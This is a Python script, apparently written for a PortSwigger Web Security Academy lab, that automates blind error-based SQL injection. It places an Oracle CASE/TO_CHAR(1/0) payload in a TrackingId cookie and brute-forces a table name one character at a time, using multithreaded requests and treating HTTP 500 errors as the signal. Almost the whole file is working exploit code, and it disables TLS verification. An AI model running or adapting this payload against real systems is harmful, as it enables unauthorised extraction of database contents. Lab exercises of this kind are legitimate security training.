import requests
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://0a32008703ca4fbe80022689004000ee.web-security-academy.net/filter?category=Gifts"

session_cookie = "ydk5v4cbqbvzESM6mqGR4dabNnur79aO"

headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*",
    "Referer": "https://0a32008703ca4fbe80022689004000ee.web-security-academy.net/"
}

# Reuse TCP connections
session = requests.Session()

ASCII_START = 32
ASCII_END = 126
MAX_LENGTH = 30
THREADS = 20


def check_character(position, ascii_code):

    payload = (
        "'||(SELECT CASE "
        f"WHEN ASCII(SUBSTR((SELECT table_name FROM user_tables WHERE ROWNUM=1),{position},1))={ascii_code} "
        "THEN TO_CHAR(1/0) "
        "ELSE '' "
        "END FROM dual)||'"
    )

    cookies = {
        "TrackingId": payload,
        "session": session_cookie
    }

    try:
        response = session.get(
            url,
            headers=headers,
            cookies=cookies,
            verify=False,
            timeout=10
        )

        if response.status_code == 500:
            return chr(ascii_code)

    except requests.exceptions.RequestException:
        pass

    return None


table_name = ""

for position in range(1, MAX_LENGTH + 1):

    found_character = None

    with ThreadPoolExecutor(max_workers=THREADS) as executor:

        futures = {
            executor.submit(check_character, position, ascii_code): ascii_code
            for ascii_code in range(ASCII_START, ASCII_END + 1)
        }

        for future in as_completed(futures):

            result = future.result()

            if result:
                found_character = result
                table_name += result

                print(f"[+] Position {position}: {result}")
                print(f"[+] Current: {table_name}")

                executor.shutdown(wait=False, cancel_futures=True)
                break

    if not found_character:
        print(f"[-] End reached at position {position}")
        break

print(f"\n[+] Final table name: {table_name}")